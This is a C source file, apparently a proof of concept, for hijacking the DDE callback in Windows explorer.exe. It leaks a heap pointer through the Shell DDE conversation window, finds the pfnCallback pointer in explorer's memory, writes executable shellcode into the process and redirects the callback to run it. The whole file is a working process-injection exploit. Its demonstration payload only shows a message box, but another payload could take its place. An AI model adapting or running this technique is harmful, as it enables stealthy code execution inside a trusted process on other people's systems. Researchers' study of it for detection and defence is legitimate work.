#include <windows.h>
#include <ddeml.h>
#include <stdio.h>


// Gobal variables to store the state of the hijack so we can restore it later
static HANDLE    g_explorer = NULL;  // process handle to explorer.exe
static ULONG_PTR g_cbAddr = 0;     // address of pfnCallback in explorer
static ULONG_PTR g_originalCb = 0;     // original pfnCallback value to restore
static LPVOID    g_remoteCode = NULL;  // shellcode page we allocated in explorer


// A dummy callback function that does nothing, just to satisfy DDEML
HDDEDATA CALLBACK NullCallback(UINT a, UINT b, HCONV c, HSZ d, HSZ e,
    HDDEDATA f, ULONG_PTR g, ULONG_PTR h) {
    return NULL;
}

// Returns the full size (in bytes) of a loaded DLL by reading its own PE header
ULONG_PTR dll_size(HMODULE h) {
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)h;
    IMAGE_NT_HEADERS *nt  = (IMAGE_NT_HEADERS *)((BYTE *)h + dos->e_lfanew);
    return nt->OptionalHeader.SizeOfImage;
}

// Returns 1 if addr is a committed private (heap) page inside the target process
int is_heap_pointer(HANDLE proc, ULONG_PTR addr) {
    if (addr < 0x10000 || addr > 0x7FFFFFFFFFFF) return 0;  // must be valid user-mode range
    MEMORY_BASIC_INFORMATION mbi = {0};
    if (!VirtualQueryEx(proc, (void *)addr, &mbi, sizeof(mbi))) return 0;
    return mbi.State == MEM_COMMIT && mbi.Type == MEM_PRIVATE;
}


// Called by Windows on Ctrl+C, Ctrl+Break, window close, logoff, or shutdown
BOOL WINAPI EmergencyCleanup(DWORD signal) {
    (void)signal;
    if (g_explorer && g_cbAddr && g_originalCb) {
        // Put the real callback back so explorer.exe keeps working
        WriteProcessMemory(g_explorer, (void*)g_cbAddr, &g_originalCb, 8, NULL);
        printf("\n[!] Emergency cleanup: pfnCallback restored\n");
    }
    if (g_explorer && g_remoteCode) {
        // Free the shellcode page we left in explorer
        VirtualFreeEx(g_explorer, g_remoteCode, 0, MEM_RELEASE);
        printf("[!] Emergency cleanup: shellcode page freed\n");
    }
    return FALSE;  // let Windows proceed with the default action (kill our process)
}

// Function to find the offsets of pfnCallback in the explorer.exe heap
int find_offsets(HANDLE proc, ULONG_PTR convStruct, int *off1, int *off2) {
    
    // user32.dll and shell32.dll are at the same base in ALL process
	HMODULE hu32 = LoadLibraryA("user32.dll");
    HMODULE hsh32 = LoadLibraryA("shell32.dll");
    ULONG_PTR u32_start = (ULONG_PTR)hu32;
    ULONG_PTR u32_end = u32_start + dll_size(hu32);
    ULONG_PTR sh32_start = (ULONG_PTR)hsh32;
    ULONG_PTR sh32_end = sh32_start + dll_size(hsh32);

    // Read the first 256 bytes of the conversation struct
	BYTE conv_buf[256] = { 0 };
    ReadProcessMemory(proc, (void*)convStruct, conv_buf, sizeof(conv_buf), NULL);

    // Walk every 8 bytes slot to look for a slot that holds a heap pointer
    for (int i = 0; i + 8 <= 250; i += 8) {
        ULONG_PTR inst_candidate = *(ULONG_PTR*)(conv_buf + i);
        if (!is_heap_pointer(proc, inst_candidate)) 
            continue;

        // Found a heap pointer, treat it as the instance struct and scan inside it 
		BYTE inst_buf[256] = { 0 };
        if (!ReadProcessMemory(proc, (void*)inst_candidate, inst_buf, sizeof(inst_buf), NULL)) 
            continue;

        // Walk every 8 byte slot to look for a pointer that points to user32.dll or shell32.dll
        for (int j = 0; j + 8 <= 256; j += 8) {
            ULONG_PTR cb = *(ULONG_PTR*)(inst_buf + j);
            int in_u32 = (cb >= u32_start && cb < u32_end);
            int in_sh32 = (cb >= sh32_start && cb < sh32_end);
            if (in_u32 || in_sh32) {
                *off1 = i;
                *off2 = j;
				printf("[+] Auto Detected : conv+0x%X -> instStruct, instStruct+0x%X -> pfnCallback\n", i, j);
                return 1;
            }
        }

       
    }

	return 0; // Not Found
}


// Here we go ...
int main() {
	
	// Simple x64 shellcode that pops a MessageBox, we will patch the address of MessageBoxA at runtime
	unsigned char shellcode_msg[] = {
        
        0x48, 0x83, 0xEC, 0x28,              // sub rsp, 0x28        (stack space for x64 call)
        0x33, 0xC9,                           // xor ecx, ecx         (arg1: hWnd = NULL)
        0x48, 0x8D, 0x15, 0x1F, 0x00, 0x00, 0x00, // lea rdx,[rip+0x1F]  (arg2: text string)
        0x4C, 0x8D, 0x05, 0x34, 0x00, 0x00, 0x00, // lea r8, [rip+0x34]  (arg3: caption string)
        0x45, 0x33, 0xC9,                    // xor r9d, r9d          (arg4: MB_OK = 0)
        0xFF, 0x15, 0x07, 0x00, 0x00, 0x00,  // call [rip+0x07]       (calls MessageBoxA)
        0x33, 0xC0,                           // xor eax, eax          (return NULL — valid for DDE)
        0x48, 0x83, 0xC4, 0x28,              // add rsp, 0x28
        0xC3,                                 // ret

        // offset 36 — MessageBoxA address, patched at runtime (8 bytes)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

        // offset 44 — text shown in the MessageBox body (28 bytes including null)
        'D','D','E',' ','C','a','l','l','b','a','c','k',' ',
        'H','i','j','a','c','k','i','n','g',' ','P','o','C','!','\0',

        // offset 72 — title bar text (10 bytes including null)
        'I','n','j','e','c','t','e','d','!','\0'
	};

    // Step 1 Register ourself as a DDE Client 
    DWORD inst = 0;
    DdeInitialize(&inst, NullCallback, APPCLASS_STANDARD, 0);
	printf("[+] DDE Client Initialized");

    // Step 2 Connect to explorer.exe Shell DDE server
    HSZ service = DdeCreateStringHandleA(inst, "Shell",CP_WINANSI);
    HSZ topic = DdeCreateStringHandleA(inst, "AppProperties", CP_WINANSI);
    HCONV conv = DdeConnect(inst, service, topic, NULL);

    if (!conv) {
        printf("[-] DdeConnect failed -> try topic: Open / Explore / Folders \n");
        return 1;
    }
    printf("[+] Connected to explorer.exe Shell DDE server \n");

    // Step 3 get the HWND of the per-conversation window that lives inside explorer.exe
    CONVINFO info = { sizeof(info) };
    DdeQueryConvInfo(conv, QID_SYNC, &info);
    HWND explorerWnd = info.hwndPartner;
    printf("[+] Explorer Conversation window : 0x%p \n",explorerWnd);

    // Step 4 reading explorer heap pointer through the kernel, no OpenProcess needed here
	ULONG_PTR convStruct = (ULONG_PTR)GetWindowLongPtr(explorerWnd, 0);
    printf("[+] heap pointer leaked via GetWindowLongPtr : 0x%p \n", convStruct);

    // Step 5 open explorer.exe so we can read and write its memory
    DWORD pid = 0;
    GetWindowThreadProcessId(explorerWnd, &pid);
	HANDLE explorer = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, pid);
    printf("[+] Opened explorer.exe ( PID %lu ) \n", pid);

    g_explorer = explorer;
    SetConsoleCtrlHandler(EmergencyCleanup, TRUE);


    // Step 6 Auto Detect the offset to pfnCallback 
	printf("[<] Scanning for pfnCallback offset in explorer.exe heap \n");
    int off1 = -1, off2 = -1;
    if (!find_offsets(explorer, convStruct, &off1, &off2)) {
        printf("[-] Failed to auto detect pfnCallback offset, try to use hardcoded offsets \n");
        CloseHandle(explorer);
        return 1;
    }

    // Follow the chain with the discovered offsets
    ULONG_PTR instStruct = 0;
    ReadProcessMemory(explorer, (void*)(convStruct + off1), &instStruct, 8, NULL);

    ULONG_PTR originalCallback = 0;
    ReadProcessMemory(explorer, (void*)(instStruct + off2), &originalCallback, 8, NULL);
	printf("[+] Original pfnCallback : 0x%p \n", originalCallback);

	// Optional because this POC is just to pop MessageBox
    // Step 7 Patch the shellcode with the read MessageBox Address
    char user32_dll[] = {'u', 's', 'e', 'r', '3', '2', '.', 'd', 'l', 'l', 0};
	char msgbox_str[] = { 'M', 'e', 's', 's', 'a', 'g', 'e', 'B', 'o', 'x', 'A', 0 };
    FARPROC msgbox = GetProcAddress(GetModuleHandleA(user32_dll), msgbox_str);

    *(ULONG_PTR*)(shellcode_msg + 36) = (ULONG_PTR)msgbox;
	printf("[+] Patched shellcode with MessageBoxA address : 0x%p \n", msgbox);

    // Step 8 Write the shellcode into a new RX page inside explorer.exe
    PVOID remoteCode = VirtualAllocEx(explorer, NULL, sizeof(shellcode_msg), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    WriteProcessMemory(explorer, remoteCode, shellcode_msg, sizeof(shellcode_msg), NULL);
	printf("[+] Shellcode written to explorer.exe at : 0x%p \n", remoteCode);

	// Making the shellcode page executable
    DWORD oldProtect = 0;
	VirtualProtectEx(explorer, remoteCode, sizeof(shellcode_msg), PAGE_EXECUTE_READ, &oldProtect);


	// Step 9 Hijack the pfnCallback pointer to point to our shellcode
    g_cbAddr = instStruct + off2;
    g_originalCb = originalCallback;
    g_remoteCode = remoteCode;

    ULONG_PTR shellcodeAddr = (ULONG_PTR)remoteCode;
    WriteProcessMemory(explorer, (void*)(instStruct + off2), &shellcodeAddr, 8, NULL);
    printf("[+] pfnCallback is Hijacked \n");


	// Step 10 final step , trigger the callback by sending a DDE message to explorer.exe
	printf("[>] Triggering the hijacked callback by sending a DDE message to explorer.exe \n");
    DdeClientTransaction((LPBYTE)"x", 2, conv, NULL, 0, XTYP_EXECUTE, 30000, NULL);

	// Step 11 Restore the original pfnCallback to avoid crashing explorer.exe
    WriteProcessMemory(explorer, (void *)(instStruct + off2), &originalCallback, 8, NULL);
	printf("[+] Restored the original pfnCallback to avoid crashing explorer.exe \n");

    // CleanUP
    g_cbAddr = 0;
    g_originalCb = 0;
    g_remoteCode = 0;

    VirtualFreeEx(explorer, remoteCode, 0, MEM_RELEASE);
    DdeDisconnect(conv);
    DdeFreeStringHandle(inst, service);
    DdeFreeStringHandle(inst, topic);
	DdeUninitialize(inst);
    CloseHandle(explorer);

	printf("\n [+] Done, explorer.exe should have popped a MessageBox \n");

	return 0;
}